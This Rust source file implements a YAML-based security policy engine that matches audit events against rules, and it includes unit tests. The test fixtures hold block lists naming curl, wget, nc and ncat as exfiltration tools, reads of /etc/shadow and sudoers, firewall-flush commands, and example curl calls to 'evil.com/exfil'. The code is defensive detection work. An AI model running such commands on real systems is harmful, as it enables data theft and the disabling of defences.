//! User-configurable YAML policy engine.
//!
//! Loads policy rules from `.yaml`/`.yml` files in configured directories. Each rule
//! specifies match criteria (exact command, substring, file glob) and an action
//! (critical, warning, info). Rules with `enforcement` fields are skipped in the
//! detection pipeline (reserved for clawsudo).
//!
//! When multiple rules match, the highest-severity verdict wins. Exclude args
//! provide allowlisting (e.g., curl to api.anthropic.com).

use std::path::Path;

use anyhow::{Context, Result};
use serde::Deserialize;

use crate::alerts::Severity;
use crate::auditd::ParsedEvent;

/// A single policy rule loaded from a YAML file.
///
/// Rules match against commands, substrings, or file access globs, and specify
/// an action (critical/warning/info). Rules with `enforcement` are reserved for clawsudo.
#[derive(Debug, Clone, Deserialize)]
pub struct PolicyRule {
    pub name: String,
    #[serde(default)]
    pub description: String,
    #[serde(rename = "match")]
    #[serde(default)]
    pub match_spec: MatchSpec,
    #[serde(default = "default_action")]
    pub action: String,
    /// If set (allow/deny), this is a clawsudo enforcement rule — skip in detection-only pipeline
    #[serde(default)]
    pub enforcement: Option<String>,
    #[serde(default = "default_enabled")]
    pub enabled: bool,
}

fn default_enabled() -> bool { true }
fn default_action() -> String { "critical".to_string() }

/// Match criteria within a policy rule.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct MatchSpec {
    /// Exact binary name matches (basename)
    #[serde(default)]
    pub command: Vec<String>,
    /// Substring matches against the full command string
    #[serde(default)]
    pub command_contains: Vec<String>,
    /// Glob patterns for file path access
    #[serde(default)]
    pub file_access: Vec<String>,
    /// If any of these strings appear in args, skip the match (whitelist)
    #[serde(default)]
    pub exclude_args: Vec<String>,
}

/// Result of evaluating an event against all policy rules.
///
/// Contains the matching rule name, its description, action, and derived severity.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PolicyVerdict {
    pub rule_name: String,
    pub description: String,
    pub action: String,
    pub severity: Severity,
}

/// Top-level YAML structure
#[derive(Debug, Deserialize)]
pub(crate) struct PolicyFile {
    #[serde(default)]
    rules: Vec<PolicyRule>,
}

/// YAML policy engine: loads rules from files and evaluates audit events against them.
///
/// Skips clawsudo enforcement rules and returns the highest-severity matching verdict.
#[derive(Debug, Clone)]
pub struct PolicyEngine {
    rules: Vec<PolicyRule>,
}

fn action_to_severity(action: &str) -> Severity {
    match action.to_lowercase().as_str() {
        "critical" | "block" => Severity::Critical,
        "warning" => Severity::Warning,
        "info" => Severity::Info,
        _ => Severity::Info,
    }
}

fn severity_rank(s: &Severity) -> u8 {
    match s {
        Severity::Critical => 3,
        Severity::Warning => 2,
        Severity::Info => 1,
    }
}

impl PolicyEngine {
    /// Create an empty policy engine
    pub fn new() -> Self {
        Self { rules: Vec::new() }
    }

    /// Merge override rules onto base rules by name.
    /// Same name = override replaces base. New names = appended.
    /// Disabled rules (enabled: false) are filtered out.
    pub fn merge_rules(base: Vec<PolicyRule>, overrides: Vec<PolicyRule>) -> Vec<PolicyRule> {
        let mut merged = base;
        for override_rule in overrides {
            if let Some(pos) = merged.iter().position(|r| r.name == override_rule.name) {
                merged[pos] = override_rule;
            } else {
                merged.push(override_rule);
            }
        }
        merged.retain(|r| r.enabled);
        merged
    }

    /// Load all .yaml/.yml files from a directory
    pub fn load(dir: &Path) -> Result<Self> {
        if !dir.exists() {
            return Ok(Self { rules: Vec::new() });
        }

        let entries = std::fs::read_dir(dir)
            .with_context(|| format!("Failed to read policy dir: {}", dir.display()))?;

        let mut files: Vec<_> = entries
            .filter_map(|e| e.ok())
            .filter(|e| {
                let path = e.path();
                match path.extension().and_then(|ext| ext.to_str()) {
                    Some("yaml") | Some("yml") => {
                        !path.file_name()
                            .and_then(|f| f.to_str())
                            .map(|f| f.starts_with("clawsudo"))
                            .unwrap_or(false)
                    }
                    _ => false,
                }
            })
            .collect();

        // Sort: default.yaml first, then alphabetical
        files.sort_by(|a, b| {
            let a_name = a.file_name();
            let b_name = b.file_name();
            let a_is_default = a_name.to_str().map(|s| s.starts_with("default")).unwrap_or(false);
            let b_is_default = b_name.to_str().map(|s| s.starts_with("default")).unwrap_or(false);
            match (a_is_default, b_is_default) {
                (true, false) => std::cmp::Ordering::Less,
                (false, true) => std::cmp::Ordering::Greater,
                _ => a_name.cmp(&b_name),
            }
        });

        let mut all_rules: Vec<PolicyRule> = Vec::new();
        for entry in files {
            let path = entry.path();
            let content = std::fs::read_to_string(&path)
                .with_context(|| format!("Failed to read {}", path.display()))?;
            let pf: PolicyFile = serde_yaml::from_str(&content)
                .with_context(|| format!("Failed to parse {}", path.display()))?;
            all_rules = Self::merge_rules(all_rules, pf.rules);
        }

        Ok(Self { rules: all_rules })
    }

    /// Load from multiple directories (first found wins, but all are loaded)
    pub fn load_dirs(dirs: &[&Path]) -> Result<Self> {
        let mut engine = Self::new();
        for dir in dirs {
            if dir.exists() {
                let loaded = Self::load(dir)?;
                engine.rules.extend(loaded.rules);
            }
        }
        Ok(engine)
    }

    /// Number of loaded rules
    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Evaluate an event against all rules. Returns the highest-severity match.
    pub fn evaluate(&self, event: &ParsedEvent) -> Option<PolicyVerdict> {
        let mut best: Option<PolicyVerdict> = None;

        for rule in &self.rules {
            if !rule.enabled {
                continue;
            }
            // Skip enforcement-only rules (clawsudo) in detection pipeline
            if rule.enforcement.is_some() {
                continue;
            }
            if self.matches_rule(rule, event) {
                let severity = action_to_severity(&rule.action);
                let dominated = best.as_ref().map_or(true, |b| severity_rank(&severity) > severity_rank(&b.severity));
                if dominated {
                    best = Some(PolicyVerdict {
                        rule_name: rule.name.clone(),
                        description: rule.description.clone(),
                        action: rule.action.clone(),
                        severity,
                    });
                }
            }
        }

        best
    }

    fn matches_rule(&self, rule: &PolicyRule, event: &ParsedEvent) -> bool {
        let spec = &rule.match_spec;

        // Command match (exact binary name)
        if !spec.command.is_empty() {
            if let Some(ref cmd) = event.command {
                let binary = event.args.first()
                    .map(|s| s.rsplit('/').next().unwrap_or(s))
                    .unwrap_or("");

                if spec.command.iter().any(|c| c.eq_ignore_ascii_case(binary)) {
                    // Check exclude_args
                    if !spec.exclude_args.is_empty() {
                        let full = cmd.to_lowercase();
                        let args_str: Vec<String> = event.args.iter().map(|a| a.to_lowercase()).collect();
                        if spec.exclude_args.iter().any(|excl| {
                            let excl_lower = excl.to_lowercase();
                            full.contains(&excl_lower) || args_str.iter().any(|a| a.contains(&excl_lower))
                        }) {
                            return false;
                        }
                    }
                    return true;
                }
            }
        }

        // Command contains (substring in full command)
        if !spec.command_contains.is_empty() {
            if let Some(ref cmd) = event.command {
                let cmd_lower = cmd.to_lowercase();
                if spec.command_contains.iter().any(|pattern| {
                    cmd_lower.contains(&pattern.to_lowercase())
                }) {
                    return true;
                }
            }
        }

        // File access (glob match on file path)
        if !spec.file_access.is_empty() {
            if let Some(ref path) = event.file_path {
                if spec.file_access.iter().any(|pattern| {
                    glob_match::glob_match(pattern, path)
                }) {
                    return true;
                }
            }
            // Also check args for file paths
            if event.command.is_some() {
                for arg in &event.args {
                    if arg.starts_with('/') {
                        if spec.file_access.iter().any(|pattern| {
                            glob_match::glob_match(pattern, arg)
                        }) {
                            return true;
                        }
                    }
                }
            }
        }

        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_exec_event(args: &[&str]) -> ParsedEvent {
        ParsedEvent {
            syscall_name: "execve".to_string(),
            command: Some(args.join(" ")),
            args: args.iter().map(|s| s.to_string()).collect(),
            file_path: None,
            success: true,
            raw: String::new(),
            actor: crate::auditd::Actor::Unknown,
            ppid_exe: None,
        }
    }

    fn make_syscall_event(name: &str, path: &str) -> ParsedEvent {
        ParsedEvent {
            syscall_name: name.to_string(),
            command: None,
            args: vec![],
            file_path: Some(path.to_string()),
            success: true,
            raw: String::new(),
            actor: crate::auditd::Actor::Unknown,
            ppid_exe: None,
        }
    }

    fn sample_yaml() -> &'static str {
        r#"
rules:
  - name: "block-data-exfiltration"
    description: "Block curl/wget to unknown hosts"
    match:
      command: ["curl", "wget", "nc", "ncat"]
      exclude_args: ["api.anthropic.com", "api.openai.com", "github.com"]
    action: critical

  - name: "deny-shadow-read"
    description: "Alert on /etc/shadow access"
    match:
      file_access: ["/etc/shadow", "/etc/sudoers", "/etc/sudoers.d/*"]
    action: critical

  - name: "deny-firewall-changes"
    description: "Alert on firewall modifications"
    match:
      command_contains: ["ufw disable", "iptables -F", "nft flush"]
    action: critical

  - name: "recon-detection"
    description: "Flag reconnaissance commands"
    match:
      command: ["whoami", "id", "uname", "env", "printenv"]
    action: warning
"#
    }

    fn load_from_str(yaml: &str) -> PolicyEngine {
        let pf: PolicyFile = serde_yaml::from_str(yaml).unwrap();
        PolicyEngine { rules: pf.rules }
    }

    #[test]
    fn test_parse_yaml_rules() {
        let engine = load_from_str(sample_yaml());
        assert_eq!(engine.rule_count(), 4);
        assert_eq!(engine.rules[0].name, "block-data-exfiltration");
        assert_eq!(engine.rules[3].action, "warning");
    }

    #[test]
    fn test_command_match_curl_critical() {
        let engine = load_from_str(sample_yaml());
        let event = make_exec_event(&["curl", "http://evil.com/exfil"]);
        let verdict = engine.evaluate(&event).unwrap();
        assert_eq!(verdict.rule_name, "block-data-exfiltration");
        assert_eq!(verdict.severity, Severity::Critical);
    }

    #[test]
    fn test_file_access_glob() {
        let engine = load_from_str(sample_yaml());
        let event = make_syscall_event("openat", "/etc/sudoers.d/custom");
        let verdict = engine.evaluate(&event).unwrap();
        assert_eq!(verdict.rule_name, "deny-shadow-read");
        assert_eq!(verdict.severity, Severity::Critical);
    }

    #[test]
    fn test_file_access_exact() {
        let engine = load_from_str(sample_yaml());
        let event = make_syscall_event("openat", "/etc/shadow");
        let verdict = engine.evaluate(&event).unwrap();
        assert_eq!(verdict.rule_name, "deny-shadow-read");
    }

    #[test]
    fn test_exclude_args_whitelist() {
        let engine = load_from_str(sample_yaml());
        let event = make_exec_event(&["curl", "https://api.anthropic.com/v1/messages"]);
        let verdict = engine.evaluate(&event);
        assert!(verdict.is_none(), "curl to whitelisted host should not match");
    }

    #[test]
    fn test_no_match_returns_none() {
        let engine = load_from_str(sample_yaml());
        let event = make_exec_event(&["ls", "-la", "/tmp"]);
        assert!(engine.evaluate(&event).is_none());
    }

    #[test]
    fn test_command_contains_match() {
        let engine = load_from_str(sample_yaml());
        let event = make_exec_event(&["ufw", "disable"]);
        let verdict = engine.evaluate(&event).unwrap();
        assert_eq!(verdict.rule_name, "deny-firewall-changes");
    }

    #[test]
    fn test_recon_warning() {
        let engine = load_from_str(sample_yaml());
        let event = make_exec_event(&["whoami"]);
        let verdict = engine.evaluate(&event).unwrap();
        assert_eq!(verdict.severity, Severity::Warning);
    }

    #[test]
    fn test_highest_severity_wins() {
        // An event matching both critical and warning should return critical
        let yaml = r#"
rules:
  - name: "low"
    description: "low"
    match:
      command: ["curl"]
    action: warning
  - name: "high"
    description: "high"
    match:
      command: ["curl"]
    action: critical
"#;
        let engine = load_from_str(yaml);
        let event = make_exec_event(&["curl", "http://evil.com"]);
        let verdict = engine.evaluate(&event).unwrap();
        assert_eq!(verdict.severity, Severity::Critical);
        assert_eq!(verdict.rule_name, "high");
    }

    #[test]
    fn test_load_from_directory() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("test.yaml"), sample_yaml()).unwrap();
        let engine = PolicyEngine::load(dir.path()).unwrap();
        assert_eq!(engine.rule_count(), 4);
    }

    #[test]
    fn test_load_nonexistent_dir() {
        let engine = PolicyEngine::load(Path::new("/nonexistent/path")).unwrap();
        assert_eq!(engine.rule_count(), 0);
    }

    #[test]
    fn test_enabled_false_disables_rule() {
        let yaml = r#"
rules:
  - name: "test-rule"
    description: "test"
    match:
      command: ["curl"]
    action: critical
    enabled: false
"#;
        let engine = load_from_str(yaml);
        let event = make_exec_event(&["curl", "http://evil.com"]);
        assert!(engine.evaluate(&event).is_none(), "Disabled rule should not match");
    }

    #[test]
    fn test_name_based_override() {
        let yaml_base = r#"
rules:
  - name: "exfil"
    description: "base"
    match:
      command: ["curl"]
      exclude_args: ["a.com"]
    action: critical
"#;
        let yaml_override = r#"
rules:
  - name: "exfil"
    description: "user override"
    match:
      command: ["curl"]
      exclude_args: ["a.com", "b.com"]
    action: warning
"#;
        let base_pf: PolicyFile = serde_yaml::from_str(yaml_base).unwrap();
        let override_pf: PolicyFile = serde_yaml::from_str(yaml_override).unwrap();
        let merged = PolicyEngine::merge_rules(base_pf.rules, override_pf.rules);
        let engine = PolicyEngine { rules: merged };

        assert_eq!(engine.rule_count(), 1);
        assert_eq!(engine.rules[0].description, "user override");
        assert_eq!(engine.rules[0].action, "warning");
    }

    #[test]
    fn test_user_adds_new_rule() {
        let yaml_base = r#"
rules:
  - name: "exfil"
    description: "base"
    match:
      command: ["curl"]
    action: critical
"#;
        let yaml_user = r#"
rules:
  - name: "my-custom-rule"
    description: "custom"
    match:
      command: ["python3"]
    action: warning
"#;
        let base_pf: PolicyFile = serde_yaml::from_str(yaml_base).unwrap();
        let user_pf: PolicyFile = serde_yaml::from_str(yaml_user).unwrap();
        let merged = PolicyEngine::merge_rules(base_pf.rules, user_pf.rules);
        let engine = PolicyEngine { rules: merged };

        assert_eq!(engine.rule_count(), 2);
    }

    #[test]
    fn test_load_merges_multiple_files_by_name() {
        let dir = tempfile::tempdir().unwrap();

        std::fs::write(dir.path().join("default.yaml"), r#"
rules:
  - name: "exfil"
    description: "base exfil"
    match:
      command: ["curl"]
    action: critical
  - name: "recon"
    description: "base recon"
    match:
      command: ["whoami"]
    action: warning
"#).unwrap();

        std::fs::write(dir.path().join("custom.yaml"), r#"
rules:
  - name: "exfil"
    description: "user exfil"
    match:
      command: ["curl"]
      exclude_args: ["mysite.com"]
    action: critical
  - name: "recon"
    enabled: false
"#).unwrap();

        let engine = PolicyEngine::load(dir.path()).unwrap();

        let event_curl = make_exec_event(&["curl", "http://evil.com"]);
        let verdict = engine.evaluate(&event_curl).unwrap();
        assert_eq!(verdict.description, "user exfil");

        let event_whoami = make_exec_event(&["whoami"]);
        assert!(engine.evaluate(&event_whoami).is_none(), "Recon should be disabled");
    }
}
